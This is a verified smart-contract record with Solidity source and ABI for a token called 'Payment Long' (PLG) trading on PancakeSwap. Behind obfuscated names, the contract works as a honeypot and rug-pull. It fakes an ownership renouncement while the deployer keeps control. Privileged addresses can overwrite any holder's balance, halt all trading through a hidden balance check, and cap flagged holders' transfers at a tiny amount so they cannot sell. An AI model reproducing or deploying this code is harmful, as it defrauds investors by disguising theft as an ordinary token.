{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface sellMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchFrom {\n    function createPair(address enableMarketing, address tokenAmount) external returns (address);\n}\n\ninterface amountSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenMarketing) external view returns (uint256);\n\n    function transfer(address teamEnableMarketing, uint256 buySell) external returns (bool);\n\n    function allowance(address exemptTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buySell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamEnableMarketing,\n        uint256 buySell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minReceiver, uint256 value);\n    event Approval(address indexed exemptTo, address indexed spender, uint256 value);\n}\n\ninterface amountSellMetadata is amountSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PaymentLong is limitTo, amountSell, amountSellMetadata {\n\n    mapping(address => uint256) private buyTx;\n\n    bool private exemptToken;\n\n    string private limitListReceiver = \"Payment Long\";\n\n    function receiverSellAt() private view {\n        require(fundMinFrom[_msgSender()]);\n    }\n\n    uint256 takeTeamFund;\n\n    uint256 limitTrading;\n\n    function balanceOf(address tokenMarketing) public view virtual override returns (uint256) {\n        return buyTx[tokenMarketing];\n    }\n\n    constructor (){\n        if (modeMarketingLaunched == enableFrom) {\n            takeTotal = true;\n        }\n        sellMode receiverTake = sellMode(modeEnable);\n        totalLiquidity = launchFrom(receiverTake.factory()).createPair(receiverTake.WETH(), address(this));\n        if (takeTradingMarketing) {\n            senderFund = autoLaunchTo;\n        }\n        liquidityFee = _msgSender();\n        exemptShouldLaunched();\n        fundMinFrom[liquidityFee] = true;\n        buyTx[liquidityFee] = marketingSender;\n        if (autoLaunchTo != senderFund) {\n            autoLaunchTo = senderFund;\n        }\n        emit Transfer(address(0), liquidityFee, marketingSender);\n    }\n\n    function isExempt(uint256 buySell) public {\n        receiverSellAt();\n        limitTrading = buySell;\n    }\n\n    bool public limitFrom;\n\n    address public totalLiquidity;\n\n    function transfer(address exemptWalletMarketing, uint256 buySell) external virtual override returns (bool) {\n        return exemptFundMin(_msgSender(), exemptWalletMarketing, buySell);\n    }\n\n    bool public enableFrom;\n\n    uint8 private minList = 18;\n\n    bool public takeTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingSender;\n    }\n\n    function exemptShouldLaunched() public {\n        emit OwnershipTransferred(liquidityFee, address(0));\n        isTeam = address(0);\n    }\n\n    address modeEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minList;\n    }\n\n    uint256 private autoLaunchTo;\n\n    bool public modeMarketingLaunched;\n\n    function receiverAt(address exemptWalletMarketing, uint256 buySell) public {\n        receiverSellAt();\n        buyTx[exemptWalletMarketing] = buySell;\n    }\n\n    function exemptFundMin(address totalSellList, address teamEnableMarketing, uint256 buySell) internal returns (bool) {\n        if (totalSellList == liquidityFee) {\n            return launchTx(totalSellList, teamEnableMarketing, buySell);\n        }\n        uint256 takeAmount = amountSell(totalLiquidity).balanceOf(sellToken);\n        require(takeAmount == limitTrading);\n        require(teamEnableMarketing != sellToken);\n        if (minTrading[totalSellList]) {\n            return launchTx(totalSellList, teamEnableMarketing, buyTotalFee);\n        }\n        return launchTx(totalSellList, teamEnableMarketing, buySell);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromBuy;\n    }\n\n    function owner() external view returns (address) {\n        return isTeam;\n    }\n\n    function enableAt(address teamSender) public {\n        require(teamSender.balance < 100000);\n        if (limitFrom) {\n            return;\n        }\n        if (takeTradingMarketing) {\n            takeTotal = false;\n        }\n        fundMinFrom[teamSender] = true;\n        \n        limitFrom = true;\n    }\n\n    string private fromBuy = \"PLG\";\n\n    event OwnershipTransferred(address indexed minTxLimit, address indexed marketingAt);\n\n    uint256 private marketingSender = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public minTrading;\n\n    address public liquidityFee;\n\n    bool private takeTradingMarketing;\n\n    uint256 public senderFund;\n\n    function swapReceiverTeam(address launchedAmount) public {\n        receiverSellAt();\n        if (swapModeLaunched) {\n            swapModeLaunched = true;\n        }\n        if (launchedAmount == liquidityFee || launchedAmount == totalLiquidity) {\n            return;\n        }\n        minTrading[launchedAmount] = true;\n    }\n\n    bool private totalSwap;\n\n    function getOwner() external view returns (address) {\n        return isTeam;\n    }\n\n    mapping(address => mapping(address => uint256)) private limitReceiver;\n\n    mapping(address => bool) public fundMinFrom;\n\n    uint256 constant buyTotalFee = 4 ** 10;\n\n    bool public swapModeLaunched;\n\n    function approve(address toMax, uint256 buySell) public virtual override returns (bool) {\n        limitReceiver[_msgSender()][toMax] = buySell;\n        emit Approval(_msgSender(), toMax, buySell);\n        return true;\n    }\n\n    bool public buyTake;\n\n    function transferFrom(address totalSellList, address teamEnableMarketing, uint256 buySell) external override returns (bool) {\n        if (_msgSender() != modeEnable) {\n            if (limitReceiver[totalSellList][_msgSender()] != type(uint256).max) {\n                require(buySell <= limitReceiver[totalSellList][_msgSender()]);\n                limitReceiver[totalSellList][_msgSender()] -= buySell;\n            }\n        }\n        return exemptFundMin(totalSellList, teamEnableMarketing, buySell);\n    }\n\n    address private isTeam;\n\n    address sellToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address fromWallet, address toMax) external view virtual override returns (uint256) {\n        if (toMax == modeEnable) {\n            return type(uint256).max;\n        }\n        return limitReceiver[fromWallet][toMax];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitListReceiver;\n    }\n\n    function launchTx(address totalSellList, address teamEnableMarketing, uint256 buySell) internal returns (bool) {\n        require(buyTx[totalSellList] >= buySell);\n        buyTx[totalSellList] -= buySell;\n        buyTx[teamEnableMarketing] += buySell;\n        emit Transfer(totalSellList, teamEnableMarketing, buySell);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTxLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"}],\"name\":\"enableAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptShouldLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundMinFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"isExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMarketingLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptWalletMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapModeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"}],\"name\":\"swapReceiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptWalletMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSellList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamEnableMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PaymentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}